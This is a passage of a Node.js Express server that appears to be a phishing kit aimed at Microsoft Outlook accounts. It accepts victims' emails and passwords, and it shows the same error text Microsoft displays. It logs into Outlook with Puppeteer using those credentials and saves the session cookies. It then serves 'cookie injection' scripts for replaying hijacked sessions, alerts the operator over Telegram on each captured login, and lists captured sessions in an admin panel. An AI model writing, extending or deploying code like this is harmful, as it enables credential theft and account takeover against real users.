                        metrics: {
                            totalAuthMs: totalAuthMs,
                            preloadUsed: false
                        }
                    });

                } else {
                    analytics.failedLogins++;
                    saveAnalytics();

                    return res.status(401).json({
                        success: false,
                        error: 'Session validation failed',
                        message: sessionValidation.error || 'Could not validate session',
                        preloadUsed: false,
                        requiresOAuth: false
                    });
                }

            } catch (automationError) {
                console.error(`❌ Cold start error for ${email}:`, automationError.message);

                try {
                    await automation.close();
                } catch (closeError) {
                    // Ignore close errors
                }

                analytics.failedLogins++;
                saveAnalytics();

                return res.status(401).json({
                    success: false,
                    error: 'Authentication failed',
                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    preloadUsed: false,
                    requiresOAuth: false
                });
            }
        }

    } catch (error) {
        console.error('Error in fast password authentication:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).json({ 
            error: 'Authentication failed',
            success: false,
            details: error.message,
            preloadUsed: false,
            requiresOAuth: false
        });
    }
});

// Direct login automation endpoint using Puppeteer
app.post('/api/login-automation', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                error: 'Email and password are required',
                success: false 
            });
        }

        const sessionId = createSessionId();
        console.log(`🤖 Starting automation login for: ${email} (Session: ${sessionId})`);

        // Initialize automation
        const automation = new OutlookLoginAutomation({
            enableScreenshots: true,
            screenshotQuality: 80
        });

        // Store automation session
        automationSessions.set(sessionId, {
            automation: automation,
            status: 'initializing',
            email: email,
            startTime: Date.now()
        });

        // Start automation process
        try {
            console.log(`🔧 Initializing browser for session: ${sessionId}`);
            await automation.init();

            automationSessions.get(sessionId).status = 'navigating';
            console.log(`🌐 Navigating to Outlook for session: ${sessionId}`);
            const navigated = await automation.navigateToOutlook();

            if (!navigated) {
                throw new Error('Failed to navigate to Outlook');
            }

            automationSessions.get(sessionId).status = 'logging_in';
            console.log(`🔐 Attempting login for session: ${sessionId}`);
            const loginSuccess = await automation.performLogin(email, password);

            if (loginSuccess) {
                automationSessions.get(sessionId).status = 'saving_session';
                console.log(`💾 Saving session cookies for: ${email}`);
                const sessionValidation = await automation.validateSession(email);

                automationSessions.get(sessionId).status = 'completed';

                analytics.successfulLogins++;
                saveAnalytics();

                console.log(`✅ Automation login successful for: ${email}`);

                // Send Telegram notification if bot is available
                if (telegramBot) {
                    try {
                        const domain = email.split('@')[1] || 'Unknown';
                        await telegramBot.sendLoginNotification({
                            email: '***@' + domain,
                            domain: domain,
                            timestamp: new Date().toISOString(),
                            sessionId: sessionId,
                            authMethod: 'Puppeteer Automation'
                        });
                        console.log(`📤 Telegram notification sent for user@${domain}`);
                    } catch (error) {
                        console.error('❌ Failed to send Telegram notification:', error.message);
                    }
                }

                res.json({
                    success: true,
                    sessionId: sessionId,
                    email: email,
                    message: 'Login successful! Session validated.',
                    sessionValidation: sessionValidation,
                    method: 'automation'
                });

                // Clean up automation after successful completion
                setTimeout(async () => {
                    try {
                        if (automationSessions.has(sessionId)) {
                            await automation.close();
                            automationSessions.delete(sessionId);
                            console.log(`🧹 Cleaned up automation session: ${sessionId}`);
                        }
                    } catch (error) {
                        console.error(`Error cleaning up automation session ${sessionId}:`, error.message);
                    }
                }, 5000);

            } else {
                automationSessions.get(sessionId).status = 'failed';

                analytics.failedLogins++;
                saveAnalytics();

                console.log(`❌ Automation login failed for: ${email}`);

                // Store failed attempt
                const sessionDir = path.join(__dirname, 'session_data');
                const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                const failureData = {
                    id: failureId,
                    sessionId: sessionId,
                    email: email,
                    reason: 'Automation Login Failed',
                    errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    timestamp: new Date().toISOString(),
                    status: 'invalid',
                    method: 'automation'
                };

                fs.writeFileSync(
                    path.join(sessionDir, `invalid_${failureId}.json`),
                    JSON.stringify(failureData, null, 2)
                );

                res.status(401).json({
                    success: false,
                    sessionId: sessionId,
                    error: 'Login failed',
                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    method: 'automation'
                });

                // Clean up failed automation
                setTimeout(async () => {
                    try {
                        if (automationSessions.has(sessionId)) {
                            await automation.close();
                            automationSessions.delete(sessionId);
                            console.log(`🧹 Cleaned up failed automation session: ${sessionId}`);
                        }
                    } catch (error) {
                        console.error(`Error cleaning up failed automation session ${sessionId}:`, error.message);
                    }
                }, 2000);
            }

        } catch (automationError) {
            console.error(`❌ Automation error for session ${sessionId}:`, automationError.message);

            if (automationSessions.has(sessionId)) {
                automationSessions.get(sessionId).status = 'error';
            }

            analytics.failedLogins++;
            saveAnalytics();

            // Clean up on error
            try {
                if (automationSessions.has(sessionId)) {
                    await automation.close();
                    automationSessions.delete(sessionId);
                }
            } catch (cleanupError) {
                console.error(`Error cleaning up automation after error:`, cleanupError.message);
            }

            res.status(500).json({
                success: false,
                sessionId: sessionId,
                error: 'Automation failed',
                message: 'Technical error during login process. Please try again.',
                details: automationError.message,
                method: 'automation'
            });
        }

    } catch (error) {
        console.error('Error in login automation endpoint:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).json({ 
            error: 'Login automation failed',
            success: false,
            details: error.message 
        });
    }
});

// Check automation status
app.get('/api/automation-status/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;

    if (automationSessions.has(sessionId)) {
        const automationSession = automationSessions.get(sessionId);
        res.json({
            sessionId: sessionId,
            status: automationSession.status,
            email: automationSession.email,
            startTime: automationSession.startTime,
            duration: Date.now() - automationSession.startTime
        });
    } else {
        res.status(404).json({
            error: 'Automation session not found',
            sessionId: sessionId
        });
    }
});

// Cancel automation session (requires session ownership)
app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const clientSessionId = req.headers['x-session-id'] || req.query.clientSessionId;

    if (automationSessions.has(sessionId)) {
        const automationSession = automationSessions.get(sessionId);

        // Verify session ownership or admin access
        const hasAdminAccess = req.headers['x-admin-token'] === process.env.ADMIN_TOKEN;
        const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId);

        if (!hasAdminAccess && !hasSessionAccess) {
            return res.status(403).json({
                error: 'Access denied - invalid session or admin token',
                sessionId: sessionId
            });
        }

        try {
            // Close the automation browser
            if (automationSession.automation) {
                await automationSession.automation.close();
            }

            // Remove from sessions
            automationSessions.delete(sessionId);

            console.log(`🚫 Cancelled automation session: ${sessionId}`);

            res.json({
                success: true,
                sessionId: sessionId,
                message: 'Automation session cancelled successfully'
            });

        } catch (error) {
            console.error(`Error cancelling automation session ${sessionId}:`, error.message);

            // Still remove from sessions even if close failed
            automationSessions.delete(sessionId);

            res.json({
                success: true,
                sessionId: sessionId,
                message: 'Automation session cancelled (with cleanup warnings)',
                warning: error.message
            });
        }
    } else {
        res.status(404).json({
            error: 'Automation session not found',
            sessionId: sessionId
        });
    }
});

// Internal redirect URL endpoint (used by automation) - Localhost only for security
app.get('/api/internal/redirect-url', (req, res) => {
    // Allow only localhost connections for security
    const clientIP = req.ip || req.connection.remoteAddress;
    if (!clientIP.includes('127.0.0.1') && !clientIP.includes('::1') && !clientIP.includes('localhost')) {
        return res.status(403).json({
            error: 'Access denied - localhost only',
            success: false
        });
    }
    try {
        // Load redirect configuration
        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
        let redirectUrl = 'https://office.com'; // Default fallback

        if (fs.existsSync(redirectConfigPath)) {
            try {
                const redirectConfig = JSON.parse(fs.readFileSync(redirectConfigPath, 'utf8'));
                if (redirectConfig.redirectUrl) {
                    redirectUrl = redirectConfig.redirectUrl;
                }
            } catch (configError) {
                console.warn('Error reading redirect config:', configError.message);
            }
        }

        res.json({
            success: true,
            redirectUrl: redirectUrl
        });
    } catch (error) {
        console.error('Error getting redirect URL:', error);
        res.json({
            success: false,
            redirectUrl: 'https://office.com'
        });
    }
});

// Get session status
app.get('/api/status', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.query.sessionId;

    if (sessionId && userSessions.has(sessionId)) {
        const session = userSessions.get(sessionId);
        const isAuthenticated = !!(session.authenticated && session.userEmail);

        res.json({
            authenticated: isAuthenticated,
            userEmail: session.userEmail,
            sessionId: sessionId,
            sessionCount: userSessions.size,
            hasToken: !!session.graphAuth?.accessToken,
            verified: !!session.verified,
            cookiesSaved: !!session.cookiesSaved
        });
    } else {
        res.json({
            authenticated: false,
            sessionCount: userSessions.size,
            message: 'No active session'
        });
    }
});

// Preload status endpoint for specific session
app.get('/api/preload-status/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        
        if (automationSessions.has(sessionId)) {
            const session = automationSessions.get(sessionId);
            res.json({
                sessionId: sessionId,
                status: session.status,
                email: session.email,
                startTime: session.startTime,
                ageMs: Date.now() - session.startTime
            });
        } else {
            res.status(404).json({
                error: 'Preload session not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error getting preload status:', error);
        res.status(500).json({
            error: 'Failed to get preload status',
            details: error.message
        });
    }
});

// Preload statistics monitoring endpoint (admin only)
app.get('/api/preload-stats', requireAdminAuth, (req, res) => {
    try {
        const stats = getPreloadStats();
        const sessionDetails = Array.from(automationSessions.entries())
            .filter(([_, session]) => session.status && session.status.startsWith('preload'))
            .map(([sessionId, session]) => ({
                sessionId: sessionId,
                email: session.email,
                status: session.status,
                startTime: session.startTime,
                ageMs: Date.now() - session.startTime
            }));

        res.json({
            success: true,
            stats: stats,
            activeSessions: sessionDetails,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Error getting preload stats:', error);
        res.status(500).json({
            error: 'Failed to get preload statistics',
            details: error.message
        });
    }
});

// Serve cookie injection scripts
app.get('/api/cookies/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const sessionDir = path.join(__dirname, 'session_data');
        const injectionFilename = `inject_session_${sessionId}.js`;
        const injectionPath = path.join(sessionDir, injectionFilename);

        if (fs.existsSync(injectionPath)) {
            const script = fs.readFileSync(injectionPath, 'utf8');
            res.setHeader('Content-Type', 'application/javascript');
            res.setHeader('Content-Disposition', `attachment; filename="${injectionFilename}"`);
            res.send(script);
        } else {
            res.status(404).json({
                error: 'Cookie injection script not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error serving cookie script:', error);
        res.status(500).json({
            error: 'Failed to serve cookie script',
            details: error.message
        });
    }
});

// Get session data with cookies
app.get('/api/session-data/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const sessionDir = path.join(__dirname, 'session_data');

        // Find session file
        const sessionFiles = fs.readdirSync(sessionDir).filter(file => 
            file.startsWith(`session_${sessionId}_`) && file.endsWith('.json')
        );

        if (sessionFiles.length > 0) {
            const sessionFile = sessionFiles[0];
            const sessionPath = path.join(sessionDir, sessionFile);
            const sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf8'));

            // Return session data without sensitive cookie values
            const publicSessionData = {
                sessionId: sessionData.sessionId,
                email: sessionData.email,
                timestamp: sessionData.timestamp,
                status: sessionData.status,
                totalCookies: sessionData.totalCookies,
                domains: sessionData.domains,
                injectFilename: sessionData.injectFilename,
                cookieNames: sessionData.cookies ? sessionData.cookies.map(c => c.name) : []
            };

            res.json(publicSessionData);
        } else {
            res.status(404).json({
                error: 'Session data not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error getting session data:', error);
        res.status(500).json({
            error: 'Failed to get session data',
            details: error.message
        });
    }
});

// Admin endpoints
app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
    const sessions = Array.from(userSessions.values()).map(session => ({
        sessionId: session.sessionId,
        userEmail: session.userEmail,
        createdAt: new Date(session.createdAt).toISOString(),
        hasAuth: !!session.graphAuth.accessToken,
        authenticated: session.authenticated,
        verified: session.verified
    }));

    res.json({
        sessions: sessions,
        totalSessions: sessions.length,
        analytics: analytics
    });
});

// Admin endpoint to revoke session
app.delete('/api/admin/session/:sessionId', requireAdminAuth, (req, res) => {
    const sessionId = req.params.sessionId;

    if (userSessions.has(sessionId)) {
        userSessions.delete(sessionId);
        res.json({ 
            success: true, 
            message: `Session ${sessionId} revoked` 
        });
    } else {
        res.status(404).json({ 
            error: 'Session not found' 
        });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 Microsoft Graph API Backend running on port', PORT);
    console.log('📧 API endpoints available at http://localhost:' + PORT + '/api/');
    console.log('🌐 Frontend available at http://localhost:' + PORT + '/');
    console.log('🔧 Admin panel available at http://localhost:' + PORT + '/ad.html');

    // Check Azure configuration
    if (process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID) {
        console.log('✅ Azure credentials configured - Graph API ready');
    } else {
        console.log('⚠️ Azure credentials missing - Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID');
    }

    if (!telegramBot) {
        console.log('❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications');
    }
});